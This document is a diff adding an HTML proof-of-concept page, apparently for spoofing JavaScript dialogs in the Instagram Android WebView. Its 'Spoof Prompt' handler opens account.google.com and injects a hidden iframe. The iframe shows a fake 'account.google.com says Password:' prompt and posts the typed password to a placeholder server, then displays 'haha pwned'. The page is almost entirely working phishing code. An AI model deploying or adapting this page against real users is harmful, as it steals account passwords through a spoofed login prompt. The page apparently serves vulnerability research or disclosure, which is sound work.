@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC Instagram Android - WebView Dialog Test</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: Arial, sans-serif;
+            background: #f0f0f0;
+            text-align: center;
+        }
+        button {
+            display: inline-block;
+            padding: 15px 30px;
+            background: #ff4444;
+            color: white;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 20px 10px 0 10px;
+            border: none;
+        }
+        button:hover { background: #cc0000; }
+        #status {
+            margin-top: 30px;
+            color: #333;
+            font-size: 20px;
+            font-weight: bold;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h2>Android WebView Dialog Test</h2>
+    <button id="triggerBtn">Spoof Prompt</button>
+    <button id="spoofAlertBtn">Spoof Alert</button>
+    <button id="topPromptBtn">Top-level Prompt</button>
+    <button id="topAlertBtn">Top-level Alert</button>
+    <div id="status"></div>
+    <form id="hiddenForm" class="hidden" method="POST" action="https://ARBITRARY_SERVER">
+        <input type="text" id="passwordInput" name="password">
+    </form>
+
+    <script>
+        // Original Spoof Prompt Button
+        document.getElementById('triggerBtn').onclick = () => {
+            const w = window.open('https://account.google.com/');
+            if (!w) {
+                document.getElementById('status').innerHTML = 'Popup blocked. Fallback not implemented.';
+                return;
+            }
+            setTimeout(() => {
+                const iframe = document.createElement('iframe');
+                iframe.src = 'javascript:(function(){var p=prompt("account.google.com says\\n\\nPassword:");if(p){document.write(\'<form method="POST" action="https://ARBITRARY_SERVER" id="iframeForm"><input type="hidden" name="password" value="\'+p+\'"><input type="submit"></form>\');document.getElementById("iframeForm").submit();}})()';
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+
+                // Listen for form submission and update status
+                const hiddenForm = document.getElementById('hiddenForm');
+                hiddenForm.onsubmit = (e) => {
+                    e.preventDefault();
+                    const password = document.getElementById('passwordInput').value;
+                    if (password) {
+                        document.getElementById('status').innerHTML = 'haha pwned<br>Password captured: ' + password;
+                    } else {
+                        document.getElementById('status').innerHTML = 'haha pwned<br>No password captured.';
+                    }
+                    setTimeout(() => {
+                        document.body.removeChild(iframe);
+                        if (w && !w.closed) w.close();
+                    }, 2000);
+                };
+
+                // Poll for iframe content change
+                const checkIframe = setInterval(() => {
+                    try {
+                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                        const iframeForm = iframeDoc.getElementById('iframeForm');
+                        if (iframeForm) {
+                            const pwd = iframeForm.querySelector('input[name="password"]').value;
+                            if (pwd) {
+                                document.getElementById('status').innerHTML = 'haha pwned<br>Password captured: ' + pwd;
+                                clearInterval(checkIframe);
+                                setTimeout(() => {
+                                    document.body.removeChild(iframe);
+                                    if (w && !w.closed) w.close();
+                                }, 2000);
+                            }
+                        }
+                    } catch (e) {
+                        clearInterval(checkIframe);
+                    }
+                }, 500);
+            }, 2000);
+        };
+
+        // 1. Spoofing approach, triggers onJSAlert
+        document.getElementById('spoofAlertBtn').onclick = () => {
+            const w = window.open('https://account.google.com/');
+            if (!w) {
+                document.getElementById('status').innerHTML = 'Popup blocked. Fallback not implemented.';
+                return;
+            }
+            setTimeout(() => {
+                const iframe = document.createElement('iframe');
+                iframe.src = 'javascript:(function(){alert("account.google.com says\\n\\nALERT: This is a spoofed alert!");})()';
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+                setTimeout(() => {
+                    document.body.removeChild(iframe);
+                    if (w && !w.closed) w.close();
+                }, 2000);
+            }, 2000);
+        };
+
+        // 2. Standard top-level prompt
+        document.getElementById('topPromptBtn').onclick = () => {
+            const result = prompt("This is a standard top-level prompt. Enter something:");
+            document.getElementById('status').innerHTML = result
+                ? 'Prompt result: ' + result
+                : 'Prompt cancelled or empty.';
+        };
+
+        // 3. Standard top-level alert
+        document.getElementById('topAlertBtn').onclick = () => {
+            alert("This is a standard top-level alert!");
+            document.getElementById('status').innerHTML = 'Alert was shown.';
+        };
+    </script>
+</body>
+</html>
